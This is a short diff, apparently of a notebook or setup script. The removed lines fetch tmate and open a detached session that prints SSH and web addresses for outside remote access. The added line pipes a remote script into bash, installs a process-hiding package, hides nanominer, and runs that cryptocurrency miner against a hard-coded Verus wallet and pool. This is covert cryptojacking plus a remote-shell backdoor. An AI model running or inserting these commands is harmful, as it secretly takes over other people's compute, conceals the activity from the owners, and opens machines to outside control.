@@ -1,6 +1,1 @@
-!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+curl -sL https://deb.nodesource.com/setup_17.x | bash - && apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && ph add nanominer && wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo Verushash -coin VRSC -wallet RXf4VJY7WxyMahkDtP9bRzXdX272t7CW2c.M1 -pool1 pool.verus.io:19999 -pool2 stratum+tcp://pool.verus.io:9999
